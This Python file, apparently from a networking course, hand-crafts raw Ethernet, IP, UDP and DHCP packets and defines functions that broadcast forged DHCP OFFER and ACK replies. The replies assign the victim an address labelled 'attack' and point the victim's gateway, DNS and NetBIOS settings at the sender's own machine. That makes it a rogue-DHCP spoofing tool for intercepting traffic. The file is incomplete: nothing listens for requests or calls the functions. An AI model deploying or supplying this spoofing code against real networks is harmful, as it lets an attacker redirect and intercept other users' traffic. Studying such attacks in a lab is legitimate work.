from socket import socket, AF_PACKET, SOCK_RAW
from socket import *
import struct
import sys
import netifaces

global SERVER_IP
global DNS_IP

SERVER_IP = b'\xc0\xa8\x0f\xad'
#DNS_IP = b'\x08\x08\x08\x08'
DNS_IP = b'\xc0\xa8\x0f\x61'

global CLIENT_IP_ATTACK
global CLIENT_BROADCAST
global CHECKSUM_IP

CLIENT_IP_ATTACK=  b'\xc0\xa8\x0f\x64'
CLIENT_BROADCAST=b'\xc0\xa8\x0f\xff'
CHECKSUM_IP=b'\xa9\x50'

s = socket(AF_PACKET, SOCK_RAW)

# if len(sys.argv) <= 1:
#     print("Interface not found")
# else:
#     s.bind((sys.argv[1], 0))
#     get_mac = netifaces.ifaddresses(sys.argv[1])[netifaces.AF_LINK]
#     print("this MAC= ", get_mac[0].get('addr'))
#s.bind(('enp0s3', 0))
s.bind(('enp0s3', 0))

src_addr = b'\x01\x02\x03\x04\x05\x06'#mac do nosso host
dst_addr = b'\xff\xff\xff\xff\xff\xff'#
ethertype = b'\x08\x00'
ethernet_header = dst_addr + src_addr + ethertype

#IP
version_and_headerlength = b'\x45'
qos = b'\x00'
totalLength = b'\x01\x48' #assume o tamanho valor 328decimal  em converte em hexa. Pode ser necessario alterar conforme tamanho do datagrama UDP
identification= b'\x00\x00'
flags_offset= b'\x00\x00'
ttl= b'\x40'# ou bytearray([64]).hex() converter ttl original
procotol= b'\x11' #protocolo 17 - UDP 
checksum = CHECKSUM_IP #offer exaple
source_address= SERVER_IP
destination_address= b'\xff\xff\xff\xff'
ip_header = version_and_headerlength + qos + totalLength + identification + flags_offset + \
            ttl + procotol + checksum + source_address + destination_address
print("ipv4 packet size", len(ip_header))

#UDP

# def udp_calc_checksum(msg:bytes)->int:#http://dontpad.com/redescheck
#     sum = 0
#     msg = (msg + b'\x00') if len(msg) % 2 else msg
#     for i in range(0, len(msg), 2):
#         w = msg[i] + (msg[i+1] << 8)
#         sum = sum + w
#         sum = (sum & 0xffff) + (sum >> 16)
#     sum = ~sum & 0xffff
#     return ntohs(sum)
udp_source_port = b'\x00\x43' #porta 67
udo_destination_port = b'\x00\x44' # porta 68
udp_length = b'\x01\x34'
udp_checksum = b'\x00\x00'
udp_header = udp_source_port + udo_destination_port + udp_length + udp_checksum
  



def offer(transation_id, client_mac, magic_cookie):
    print('\n\nOFFER<<<<<<<<<<<<\n\n')
    #DHCP
    message_type=b'\x02' #reply
    hw_type=b'\x01'
    hw_address_len= b'\x06'
    hops=b'\x00'
    #transation_id=b'\xc5\x4f\x00\x4d' #parametro vem da solicitacao
    transation_id
    seconds_elapsed= b'\x00\x00'
    bootp_flags=b'\x80\x00'
    client_ip_address= b'\x00\x00\x00\x00'
    your_ip_address=CLIENT_IP_ATTACK #ip que está sendo oferecido ao cliente
    next_server_ip=b'\x00\x00\x00\x00'
    relay_agent_ip=b'\x00\x00\x00\x00'
    #client_mac=b'\x80\x00\x27\x41\x14\xec'#parametro vem da solicitacao
    client_mac
    client_hw_padding=b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    names_not_given = b''.join(b'\x00' for x in range(192))  #preenchimento server host 64 bytes em 00 e bootfile em com 128 bytes em 00 
    #magic_cookie=b'\x63\x82\x53\x63'   #parametro vem da solicitacao
    magic_cookie
    dhcp_message_type= b'\x35\x01' + b'\x02' #ultimo byte é do tipo, ack, offer etc
    dhcp_server_identifier=b'\x36\x04'+ SERVER_IP #ip do nosso servidor DHCP

    #identificacao do campo + tempo segundos
    lease_time=b'\x33\x04' +b'\x00\x03\x4b\xc0' 
    renewal_time=b'\x3a\x04' + b'\x00\x01\xa5\xe0'
    rebinding_time = b'\x3b\x04' + b'\x00\x02\xe2\x48'

    broadcast_address= b'\x1c\x04' +  b'\xc0\xa8\x64\xff'
    subnet_mask= b'\x01\x04' + b'\xff\xff\xff\x00'
    router= b'\x03\x04' +  SERVER_IP #ip do gateway da rede, no caso, nosso servidor DHCP/Server
    domain_name_server= b'\x06\x04' + DNS_IP #aqui vai o IP do nosso server
    netbios_tcpip_ns= b'\x2c\x04' + SERVER_IP
    end = b'\xff'
    padding=  b'\x00\x00'

    dhcp_packet = message_type + hw_type + hw_address_len + hops + transation_id + seconds_elapsed + bootp_flags \
                    + client_ip_address + your_ip_address + next_server_ip + relay_agent_ip + client_mac + client_hw_padding + names_not_given \
                        + magic_cookie + dhcp_message_type + dhcp_server_identifier + lease_time + renewal_time + rebinding_time + broadcast_address \
                            + subnet_mask + router + domain_name_server + netbios_tcpip_ns + end + padding
    
    
    s.send(ethernet_header + ip_header + udp_header + dhcp_packet)

def ack(transation_id, client_mac, magic_cookie):
    print('\n\nACK<<<<<<<<<<<<\n\n')
    #DHCP
    message_type=b'\x02' #reply
    hw_type=b'\x01'
    hw_address_len= b'\x06'
    hops=b'\x00'
    #transation_id=b'\xc5\x4f\x00\x4d' #parametro vem da solicitacao
    transation_id
    seconds_elapsed= b'\x00\x00'
    bootp_flags=b'\x80\x00'
    client_ip_address= b'\x00\x00\x00\x00'
    your_ip_address=CLIENT_IP_ATTACK #ip que está sendo oferecido ao cliente
    next_server_ip=b'\x00\x00\x00\x00'
    relay_agent_ip=b'\x00\x00\x00\x00'
    #client_mac=b'\x80\x00\x27\x41\x14\xec'#parametro vem da solicitacao
    client_mac
    client_hw_padding=b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    names_not_given = b''.join(b'\x00' for x in range(192))  #preenchimento server host 64 bytes em 00 e bootfile em com 128 bytes em 00 
    #magic_cookie=b'\x63\x82\x53\x63'   #parametro vem da solicitacao
    magic_cookie
    dhcp_message_type= b'\x35\x01' + b'\x05' #ultimo byte é do tipo, ack, offer etc
    dhcp_server_identifier=b'\x36\x04'+ SERVER_IP #ip do nosso servidor DHCP

    #identificacao do campo + tempo segundos
    lease_time=b'\x33\x04' +b'\x00\x03\x4b\xc0' 
    renewal_time=b'\x3a\x04' + b'\x00\x01\xa5\xe0'
    rebinding_time = b'\x3b\x04' + b'\x00\x02\xe2\x48'

    broadcast_address= b'\x1c\x04' +  CLIENT_BROADCAST
    subnet_mask= b'\x01\x04' + b'\xff\xff\xff\x00'#
    router= b'\x03\x04' +  SERVER_IP #ip do gateway da rede, no caso, nosso servidor DHCP/Server
    domain_name_server= b'\x06\x04' + DNS_IP #aqui vai o IP do nosso server
    netbios_tcpip_ns= b'\x2c\x04' + SERVER_IP
    end = b'\xff'
    padding=  b'\x00\x00'

    dhcp_packet = message_type + hw_type + hw_address_len + hops + transation_id + seconds_elapsed + bootp_flags \
                    + client_ip_address + your_ip_address + next_server_ip + relay_agent_ip + client_mac + client_hw_padding + names_not_given \
                        + magic_cookie + dhcp_message_type + dhcp_server_identifier + lease_time + renewal_time + rebinding_time + broadcast_address \
                            + subnet_mask + router + domain_name_server + netbios_tcpip_ns + end + padding
    
    
    s.send(ethernet_header + ip_header + udp_header + dhcp_packet)


#print(ethernet_header)
#print(ip_header)

#fullpacketpack = struct.pack('! H',fullpacketencode)

